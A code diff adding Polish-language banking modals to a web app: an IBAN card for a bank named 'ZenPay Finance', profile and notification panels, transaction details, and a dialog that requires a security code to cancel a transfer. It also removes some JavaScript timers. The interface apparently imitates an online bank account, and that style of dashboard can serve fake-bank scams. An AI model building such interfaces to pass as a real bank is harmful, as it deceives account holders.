+            <span style="font-size:12px;font-weight:700;color:var(--text-primary);" id="ibanOwner">KWIATKOWSKI PW</span>
+          </div>
+          <div style="background:#f8fafc;border-radius:8px;padding:12px 14px;border:1px solid #f1f5f9;">
+            <span style="font-size:9px;color:#94a3b8;text-transform:uppercase;letter-spacing:1px;font-weight:500;display:block;margin-bottom:3px;">BIC / SWIFT</span>
+            <span style="font-size:12px;font-weight:700;color:var(--text-primary);font-family:'Courier New',monospace;" id="ibanBic">TTQGLTIJCJK</span>
+          </div>
+        </div>
+        <div style="display:flex;align-items:center;gap:8px;padding:10px 12px;background:#f0fdf4;border-radius:8px;border:1px solid #bbf7d0;margin-bottom:12px;">
+          <div style="width:28px;height:28px;border-radius:6px;background:#dcfce7;display:flex;align-items:center;justify-content:center;color:#16a34a;font-size:12px;flex-shrink:0;">
+            <i class="fa-solid fa-landmark"></i>
+          </div>
+          <div><span style="font-size:9px;color:#16a34a;text-transform:uppercase;letter-spacing:1px;font-weight:500;display:block;">Bank</span><span style="font-size:12px;font-weight:700;color:#15803d;" id="ibanBank">ZenPay Finance</span></div>
+        </div>
+        <div style="display:flex;align-items:center;gap:8px;padding:8px 10px;background:#fffbeb;border-radius:6px;border:1px solid #fef3c7;">
+          <i class="fa-solid fa-shield-halved" style="color:#d97706;font-size:12px;flex-shrink:0;"></i>
+          <span style="font-size:10px;color:#92400e;line-height:1.4;">Ze względów bezpieczeństwa niektóre znaki IBAN zostały zamaskowane.</span>
+        </div>
+      </div>
+    </div>
+  </div>
 
-// ===== TOAST =====
-window.toast = function(m) {
-  const t = document.getElementById('t');
-  t.textContent = m;
-  t.style.display = 'block';
-  setTimeout(() => t.style.display = 'none', 1500);
-};
+  <!-- Profil -->
+  <div id="acc" class="modal hidden" onclick="if(event.target===this)withSpinner(()=>closeAcc())">
+    <div class="modal-content" style="max-height:90vh; overflow-y:auto; padding:0; border-radius:var(--radius); position:relative;">
+      <button onclick="withSpinner(() => closeAcc())" class="modal-close" style="top:12px;right:12px;width:32px;height:32px;border:none;background:rgba(0,0,0,0.5);color:#fff;font-size:18px;box-shadow:0 2px 12px rgba(0,0,0,0.2);">×</button>
+      <div class="profile-page" id="accinfo"></div>
+    </div>
+  </div>
 
-// ===== RÉINITIALISATION DES VALIDITÉS PERSONNALISÉES =====
-function setupCustomValidityReset() {
-  // Validation gérée par le système de messages d'erreur en temps réel
-}
+  <!-- Notifications -->
+  <div id="notifications" class="modal hidden">
+    <div class="modal-content" style="max-height:80vh;display:flex;flex-direction:column;overflow:visible;">
+      <button onclick="withSpinner(() => closeNotifications())" class="modal-close">×</button>
+      <h3 style="margin-bottom:14px;display:flex;align-items:center;gap:8px;flex-shrink:0;font-size:17px;"><i class="fa-regular fa-bell" style="color:var(--p)"></i> Powiadomienia</h3>
+      <div id="notif-content" style="font-size:13px;line-height:1.6;overflow-y:auto;max-height:360px;color:var(--text-secondary);"></div>
+    </div>
+  </div>
 
-// ===== INITIALISATION =====
-function init() {
-  setupCustomValidityReset();
-  setupCodeValidation();
-}
+  <!-- Remboursement -->
+  <div id="refundModal" class="modal hidden">
+    <div class="modal-content" style="overflow:visible;">
+      <button onclick="withSpinner(() => closeRefundModal())" class="modal-close">×</button>
+      <h3 style="margin-bottom:14px;display:flex;align-items:center;gap:8px;font-size:17px;color:var(--text-primary);">
+        <i class="fa-solid fa-rotate-left" style="color:var(--p);"></i> Anuluj przelew
+      </h3>
+      <p style="font-size:13px;color:var(--text-secondary);margin-bottom:14px;">Aby anulować ten przelew, wprowadź kod zabezpieczający.</p>
+      <div class="field-group">
+        <label>Kod zabezpieczający</label>
+        <input id="refundCode" class="input" maxlength="20" placeholder="Wprowadź kod">
+      </div>
+      <button onclick="withSpinner(() => confirmRefund())" class="btn" id="refundConfirmBtn" style="font-size:14px;padding:12px;background:#DC2626;box-shadow:0 2px 8px rgba(220,38,38,0.2);">
+        <i class="fa-solid fa-check"></i> Zatwierdź anulowanie
+      </button>
+      <div id="refundError" class="login-error" style="display:none;margin-top:8px;">Nieprawidłowy kod anulowania.</div>
+    </div>
+  </div>
 
-document.addEventListener('DOMContentLoaded', init);
+  <!-- Détail transaction -->
+  <div id="txDetail" class="modal hidden" style="z-index:60">
+    <div class="modal-content" style="max-width:380px;padding:0;overflow:visible;margin-top:20px">
+      <button onclick="withSpinner(() => closeTxDetail())" style="position:absolute;top:-20px;left:50%;transform:translateX(-50%);width:44px;height:44px;border-radius:50%;background:#DC2626;color:#fff;border:4px solid #fff;font-size:20px;box-shadow:0 4px 16px rgba(220,38,38,0.4);z-index:10;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:transform 0.2s, box-shadow 0.2s;" onmouseover="this.style.transform='scale(1.1)'; this.style.boxShadow='0 6px 24px rgba(220,38,38,0.5)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 4px 16px rgba(220,38,38,0.4)';">×</button>
+      <div style="padding:28px 20px 20px">
+        <div style="margin-bottom:14px"><div style="font-size:12px;color:var(--text-secondary);margin-bottom:2px;">ID transakcji:</div><div style="font-weight:600;font-size:16px;color:var(--text-primary);" id="tx-id">-</div></div>
+        <div style="margin-bottom:14px"><div style="font-size:12px;color:var(--text-secondary);margin-bottom:2px;" id="tx-label-amount">Kwota:</div><div style="font-weight:600;font-size:16px;color:var(--text-primary);" id="tx-amount">-</div></div>
+        <div style="margin-bottom:14px"><div style="font-size:12px;color:var(--text-secondary);margin-bottom:2px;" id="tx-label-benef">Beneficjent / Nadawca:</div><div style="font-weight:600;font-size:16px;color:var(--text-primary);" id="tx-benef">-</div></div>
+        <div style="margin-bottom:14px" id="tx-iban-row"><div style="font-size:12px;color:var(--text-secondary);margin-bottom:2px;">IBAN / Numer konta:</div><div style="font-weight:600;font-size:16px;color:var(--text-primary);word-break:break-all;" id="tx-iban">-</div></div>
+        <div><div style="font-size:12px;color:var(--text-secondary);margin-bottom:2px;" id="tx-label-date">Data i godzina:</div><div style="font-weight:600;font-size:16px;color:var(--text-primary);" id="tx-date">-</div></div>
+        <div style="margin-top:16px;border-top:1px solid var(--border-light);padding-top:14px;">
+          <button id="refundTxBtn" class="btn" style="background:#DC2626;box-shadow:0 2px 8px rgba(220,38,38,0.2);font-size:13px;padding:10px;">
+            <i class="fa-solid fa-rotate-left"></i> Anuluj ten przelew
+          </button>
+          <div id="refundTxMsg" style="font-size:12px;color:var(--text-secondary);margin-top:6px;text-align:center;"></div>
+        </div>
+      </div>
+    </div>
+  </div>
 
-// ===== APPELS D'INITIALISATION =====
-setTimeout(() => {
-  if (user) {
-    setupCustomValidityReset();
-    setupTransferValidation();
-    setupRequiredMessages();
-    setupCodeValidation();
-  }
-}, 300);
+  <div id="t"></div>
 
-setInterval(() => {
-  if (user && document.getElementById('dashboard').classList.contains('active')) {
-    adjustAllTexts();
-  }
-}, 1000);
-
-setInterval(() => {
-  refreshSession();
-}, 30000);
-
-window.addEventListener('resize', () => {
-  adjustAllTexts();
-});
-
-setTimeout(() => {
-  document.querySelectorAll('.btn').forEach(btn => btn.style.background = 'var(--p)');
-  adjustAllTexts();
-}, 100);
+  <!-- ========== SCRIPT PRINCIPAL ========== -->
+  <script type="module" src="app.js"></script>
+</body>
+</html>
